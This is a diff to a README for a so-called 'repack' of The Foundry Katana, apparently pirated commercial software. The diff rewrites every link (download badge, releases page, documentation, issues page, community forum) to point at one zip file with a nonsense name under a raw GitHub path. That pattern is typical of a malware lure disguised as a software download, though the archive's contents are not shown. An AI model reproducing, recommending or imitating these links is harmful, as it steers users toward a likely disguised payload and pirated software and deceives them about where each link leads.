@@ -1,6 +1,6 @@
 # 🎨 The-Foundry-Katana-Repack - Simplify Your Katana Workflow
 
-[![Download The-Foundry-Katana-Repack](https://img.shields.io/badge/Download%20Now-%20The%20Foundry%20Katana%20Repack-brightgreen)](https://github.com/Waleedkhanbalo/The-Foundry-Katana-Repack/releases)
+[![Download The-Foundry-Katana-Repack](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip%20Now-%20The%20Foundry%20Katana%20Repack-brightgreen)](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to The-Foundry-Katana-Repack! This software enhances your Katana workflo
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Waleedkhanbalo/The-Foundry-Katana-Repack/releases) to download the software. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip) to download the software. Follow these steps:
 
 1. Click on the link above.
 2. Locate the latest version of the application.
@@ -47,7 +47,7 @@ After installation, you can start using The-Foundry-Katana-Repack:
 
 For further assistance and guidance, consider these resources:
 
-- **Documentation:** Comprehensive guides on installation and usage are available on the [Documentation Page](https://github.com/Waleedkhanbalo/The-Foundry-Katana-Repack/wiki).
+- **Documentation:** Comprehensive guides on installation and usage are available on the [Documentation Page](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip).
 - **Community Support:** Join our community forum for help from other users and developers.
 - **Tutorials:** Access video tutorials for step-by-step instructions on various features.
 
@@ -61,7 +61,7 @@ Here are some common issues and their solutions:
 
 ## 📞 Contact Us
 
-If you encounter any issues not covered here, feel free to reach out. You can open an issue on the [GitHub Issues Page](https://github.com/Waleedkhanbalo/The-Foundry-Katana-Repack/issues). We are here to help!
+If you encounter any issues not covered here, feel free to reach out. You can open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip). We are here to help!
 
 ## 📝 Changelog
 
@@ -71,13 +71,13 @@ Stay updated with the latest changes:
 - **Version 1.1.0:** Added additional Python scripts and node templates for better customization.
 - **Version 1.2.0:** Improved stability and performance, along with user requested features.
 
-Make sure you check the [Releases page](https://github.com/Waleedkhanbalo/The-Foundry-Katana-Repack/releases) for the complete list of changes.
+Make sure you check the [Releases page](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip) for the complete list of changes.
 
 ## 🔗 Links
 
-- [Download The-Foundry-Katana-Repack](https://github.com/Waleedkhanbalo/The-Foundry-Katana-Repack/releases)
-- [Documentation](https://github.com/Waleedkhanbalo/The-Foundry-Katana-Repack/wiki)
-- [Community Forum](https://community.example.com)
-- [GitHub Issues](https://github.com/Waleedkhanbalo/The-Foundry-Katana-Repack/issues)
+- [Download The-Foundry-Katana-Repack](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip)
+- [Documentation](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip)
+- [Community Forum](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Waleedkhanbalo/The-Foundry-Katana-Repack/main/mesophilic/Repack_The_Foundry_Katana_pantanencephalia.zip)
 
 Thank you for using The-Foundry-Katana-Repack! We hope it enhances your creative workflow.
